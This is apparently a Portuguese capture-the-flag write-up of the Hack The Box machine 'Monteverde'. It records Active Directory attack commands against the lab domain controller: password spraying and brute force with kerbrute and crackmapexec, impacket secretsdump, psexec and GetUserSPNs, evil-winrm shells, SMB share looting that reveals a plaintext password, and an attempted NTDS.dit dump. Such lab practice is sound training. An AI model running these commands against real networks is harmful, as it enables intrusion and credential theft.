Monteverde
===================

Inicio padrao:

# Enumeration

    sudo nmap_enum monteverde.htb


## Obtendo senha do usuario

Com as informacoes de usuarios e grupos, podemos fazer alguns teste tais como testar ASREP (3), forca bruta (2), password spray (1) ou forca bruta tambem, mas com crackmapexec


1)
Este pode ser tentado caso a gente consiga alguma senha valida:

    kerbrute passwordspray -d test.local domain_users.txt password123

2)
Funcionou. Aqui formatamos as credenciais em um arquivo com o seguinte comando:

    awk {'print $1":"$1'} usersnames.txt > credenciais.txt    
    kerbrute bruteforce -d MEGABANK.LOCAL --dc 10.10.10.172 credenciais.txt
    
![qownnotes-media-sytpug](../../../media/qownnotes-media-sytpug.png)

    
    kerbrute bruteuser -d MEGABANK.LOCAL --dc 10.10.10.172 passwords.txt SABatchJobs

3)
Nao funcionou
    
    python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
 
 ![qownnotes-media-rIafnT](../../../media/qownnotes-media-rIafnT.png)

4) Funcionou

    crackmapexec smb 10.10.10.1 -u users.txt -p passwords.txt

## Exploitation

Depois disso eu fiz alguns testes pra saber como seria essa parte da exploracao

Tentei dumpar a base de hashes (sem sucesso)

    impacket-secretsdump MEGABANK.LOCAL\SABatchJobs:SABatchJobs@10.10.10.172

    impacket-secretsdump MEGABANK.LOCAL/SABatchJobs:SABatchJobs@10.10.10.172

Tentei obter shell

    impacket-psexec MEGABANK.LOCAL/SABatchJobs:SABatchJobs@10.10.10.172

Tentei obter alguns usuários de serviço:

    impacket-GetUserSPNs MEGABANK.LOCAL/SABatchJobs:SABatchJobs -dc-ip 10.10.10.172 -request
    
Tentei novamente com winrm pra ver se obtia a shell e não funcionou:
    
    evil-winrm -i 10.10.10.172 -u SABatchJobs -p SABatchJobs
  
 Fiz a enumeração novamente e aí sim consegui obter mais informações:
 
    enum4linux -u SABatchJobs -p SABatchJobs -a 10.10.10.172

Quando notei o output desta ferramenta vi que tinha um share disponível lá, cujo conteúdo era um arquivo azure.xml
e obtive esse retorno da seguinte maneira:

    smbclient //10.10.10.172/users$ -U 'MEGABANK.LOCAL/SABatchJobs' -c "recurse true; ls"

![qownnotes-media-akQynY](../../../media/qownnotes-media-akQynY.png)

    smbclient //10.10.10.172/users$ -U 'MEGABANK.LOCAL/SABatchJobs'                      
           Password for [MEGABANK.LOCAL\SABatchJobs]:
    Try "help" to get a list of possible commands.
    smb: \> cd mhope
    smb: \mhope\> get azure.xml
    getting file \mhope\azure.xml of size 1212 as azure.xml (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
    smb: \mhope\> exit
                                                                                                                                                                           
    ┌──(acosta㉿kali)-[~]
    └─$ cat azure.xml    
    ��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
      <Obj RefId="0">
        <TN RefId="0">
          <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
          <T>System.Object</T>
        </TN>
        <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
        <Props>
          <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
          <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
          <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
          <S N="Password">4n0therD4y@n0th3r$</S>
        </Props>
      </Obj>
    </Objs>

![qownnotes-media-hfqBgU](../../../media/qownnotes-media-hfqBgU.png)


Acabamos de obter mais um usuário de domínio agora:

user: mhope
senha: 4n0therD4y@n0th3r$

## Escalacao de privilegio

Desta vez conseguimos acesso via evilrm... No entanto, quando fui obter mais informações a respeito do sistema, não foi possível, porque não tinha permissão pra isso:

    evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
    
![qownnotes-media-KkHbge](../../../media/qownnotes-media-KkHbge.png)

    systeminfo > sysinfo.txt]

E novamente voltei para o passo anterior para prosseguir com a enumeração:

    enum4linux -u mhope -p '4n0therD4y@n0th3r$' 10.10.10.172

Dessa vez notei que o SYSVOL está disponível e tem algumas coisas lá dentro que eu precisava verificar:

    smbclient //10.10.10.172/SYSVOL -U 'MEGABANK.LOCAL/mhope' -c "recurse true; ls"

![qownnotes-media-IrzkjH](../../../media/qownnotes-media-IrzkjH.png)


Tentando de outras formas aqui, tais como:

    sudo apt install bloodhound.py bloodhound
 

    bloodhound-python -u mhope -p '4n0therD4y@n0th3r$' -d MEGABANK.LOCAL -v --zip -c All -dc MEGABANK.LOCAL -ns 10.10.10.172

    impacket-samrdump 'MEGABANK.LOCAL/mhope:4n0therD4y@n0th3r$@10.10.10.172'

    impacket-secretsdump -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 10.10.10.172 'MEGABANK.LOCAL/mhope:4n0therD4y@n0th3r$@10.10.10.172'








